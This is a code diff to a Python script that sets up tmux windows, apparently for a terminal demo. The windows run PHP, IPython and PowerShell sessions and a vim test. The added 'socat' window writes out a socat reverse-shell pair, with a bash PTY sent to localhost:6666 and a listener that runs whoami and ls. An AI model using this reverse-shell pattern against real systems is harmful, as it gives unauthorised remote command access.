@@ -5,38 +5,69 @@ def spawn_main():
     """You don't  need a main function. 
 Everything that starts with spawn_ will be regonised by the dashboard spawner.
 """
-    main_session = renew_session('main')
+    main_session = renew_session(
+        'main',
+        # keep_session=True,
+        # start_directory="/tmp/"
+    )
     main_session.attached_window.rename_window('programming')
-    php = 'php -a\n' + all_files["PHP_code_with_errors"] + '\nexit'
+    php = 'php -a\n' + \
+        get_file_content(all_files["PHP_code_with_errors"]) + '\nexit'
     python = 'ipython3\n' + \
-        all_files["Python_code_with_errors"] + 'string_example)\nexit()'
-    pwsh = 'pwsh' + all_files["POWERSHELL_code_with_errors"] + '\nexit'
-    pane = main_session.attached_pane
-    panes_from_list(pane,
+        get_file_content(
+            all_files["Python_code_with_errors"]) + 'string_example)\nexit()'
+    pwsh = 'pwsh\n' + \
+        get_file_content(all_files["POWERSHELL_code_with_errors"]) + '\nexit'
+    panes_from_list(main_session,
                     [
                         php,
                         python,
                         pwsh,
                     ],
-                    send_enter=False
+                    send_enter=False,
+                    all_unchecked=False,
+                    start_directory='~/../'
                     )
     main_session.new_window()
     main_session.attached_window.rename_window('socat')
-    panes_from_list(main_session.attached_pane,
+    socat_v = "sleep 5\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:localhost:6666\n"
+    socat_a = 'socat file:$(tty),raw,echo=0 tcp-listen:6666\n\nwhoami\nls -la\ncd /\nexit\n'
+    panes_from_list(main_session,
                     [
-                        all_files["socat_attacker"],
-                        all_files["socat_victim"]
+                        socat_v,
+                        socat_a
                     ],
-                    send_enter=False
+                    send_enter=True,
+                    all_unchecked=True
                     )
+    wait_untill_msg(main_session.attached_pane, 'logout')
     main_session.new_window()
     main_session.attached_window.rename_window('tryout')
-    panes_from_list(main_session.attached_pane,
+    panes_from_list(main_session,
                     [
-                        all_files["functions_tryout"]
+                        get_file_content(all_files["functions_tryout"])
                     ],
-                    send_enter=False
+                    send_enter=False,
+                    all_unchecked=False
                     )
+    main_session.new_window()
+    main_session.attached_window.rename_window('vim? :O')
+    edit_a_test_file_with_vim = """vim /tmp/testing
+i
+testing :D 
+
+"""
+    panes_from_list(main_session,
+                    [
+                        edit_a_test_file_with_vim
+                    ],
+                    all_unchecked=True
+                    )
+    main_session.cmd('send-keys', 'Escape')
+    main_session.cmd('send-keys', ':wq!\n')
+    while not(at_end(main_session.attached_pane)):
+        pass
+    main_session.cmd('send-keys', 'cat /tmp/testing\n')
 
 
 if __name__ == "__main__":
